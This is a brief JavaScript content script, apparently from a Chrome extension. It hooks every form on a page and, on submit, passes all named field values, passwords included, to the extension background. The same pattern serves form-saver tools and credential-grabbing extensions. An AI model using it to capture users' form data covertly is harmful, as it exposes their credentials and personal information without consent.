var i, j;
var form;
var onsubmit;

var generateHandler = function (form, i, onsubmit) {
	return function () {
		if (onsubmit) onsubmit();

		var data = {};
		var input;

		for (j = 0; j < form.elements.length; j++) {
			input = form.elements[j]
			if (input.name) data[input.name] = input.value;
		}

		chrome.runtime.sendMessage({form: i, data: data});
	};
};

for (i = 0; i < document.forms.length; i++) {
	form = document.forms[i];
	form.onsubmit = generateHandler(form, i, form.onsubmit);
}
